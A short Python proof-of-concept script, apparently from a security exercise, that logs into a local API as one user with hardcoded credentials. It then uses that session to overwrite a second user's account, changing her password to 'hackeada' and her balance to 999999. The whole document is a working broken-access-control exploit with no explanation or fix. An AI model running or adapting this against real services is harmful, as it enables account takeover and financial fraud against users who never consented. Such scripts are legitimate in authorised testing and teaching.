import requests

URL = "http://localhost:8080/api/v1"

token = requests.post(f"{URL}/login", json={"username": "Paco", "password": "Pacoso27.."}).json()["sessionToken"]

r = requests.put(f"{URL}/users/2", headers={"Token": token},
                 json={"username": "Ana", "password": "hackeada", "money": 999999})

print("Modificar a Ana:", r.status_code, r.text)
print(requests.get(f"{URL}/users/2").text)